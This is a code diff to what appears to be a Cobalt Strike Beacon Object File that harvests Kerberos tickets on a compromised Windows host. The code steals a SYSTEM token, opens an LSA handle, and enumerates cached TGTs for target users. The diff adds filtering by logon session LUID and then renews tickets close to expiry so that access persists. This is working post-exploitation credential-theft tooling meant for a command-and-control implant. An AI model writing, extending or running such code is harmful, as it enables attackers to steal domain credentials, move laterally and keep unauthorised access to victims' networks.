@@ -460,10 +460,10 @@ VOID go(char* args, int argc) {
 
     BeaconDataParse(&parser, args, argc);
     int interval = BeaconDataInt(&parser);
-    char* targetUsers = BeaconDataExtract(&parser, NULL);
     int threshold = BeaconDataInt(&parser);
-    char* dc = NULL; 
-
+    char* targetUsers = BeaconDataExtract(&parser, NULL);
+    char* targetLuids = BeaconDataExtract(&parser, NULL); 
+    
     if (!IsSystem()) {
         HANDLE hToken = StealSystemToken();
         if (!hToken) {
@@ -473,18 +473,19 @@ VOID go(char* args, int argc) {
         ADVAPI32$SetThreadToken(NULL, hToken);
         KERNEL32$CloseHandle(hToken);
     }
-
+    
     HANDLE hLsa = 0;
     if (!NT_SUCCESS(GetLsaHandle(&hLsa)))
-        return;
-
+    return;
+    
     ULONG authPackage = 0;
     LSA_STRING krbAuth = { .Buffer = "kerberos", .Length = 8, .MaximumLength = 9 };
     if (!NT_SUCCESS(SECUR32$LsaLookupAuthenticationPackage(hLsa, &krbAuth, &authPackage))) {
         SECUR32$LsaDeregisterLogonProcess(hLsa);
         return;
     }
-
+    
+    char* dc = NULL; 
     GetDomainController(&dc); 
     if(!dc){
         BeaconPrintf(CALLBACK_ERROR, "[-] Could not find domain controller.\n");
@@ -495,19 +496,28 @@ VOID go(char* args, int argc) {
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Domain Controller : %s\n", dc);
     if (targetUsers && targetUsers[0] != '\0')
         BeaconPrintf(CALLBACK_OUTPUT, "[*] Target users      : %s\n", targetUsers);
+    if (targetLuids && targetLuids[0] != '\0')
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] Target LUIDs      : %s\n", targetLuids);
     BeaconPrintf(CALLBACK_OUTPUT, "\n"); 
     BeaconWakeup();
 
     do {
         TICKET_CACHE curr = { 0 };
 
-        if (NT_SUCCESS(EnumerateTickets(hLsa, authPackage, targetUsers, &curr))) {
+        // Retrieve tickets for target users
+        if (NT_SUCCESS(EnumerateTGTs(hLsa, authPackage, targetUsers, &curr))) {
             for (int i = 0; i < curr.count; i++) {
                 PTICKET_ENTRY ticket = &curr.tickets[i];
 
+                // Filter for target LUID 
+                if (!IsTargetLuid(targetLuids, ticket->luid))
+                    continue; 
+
+                // Check if TGT can be renewed
                 if (IsExpired(ticket))
                     continue;
 
+                // Check if TGT expires within <threshold> minutes
                 if (Expires(ticket, threshold)) {
                     LARGE_INTEGER now = { 0 };
                     NTDLL$NtQuerySystemTime(&now);
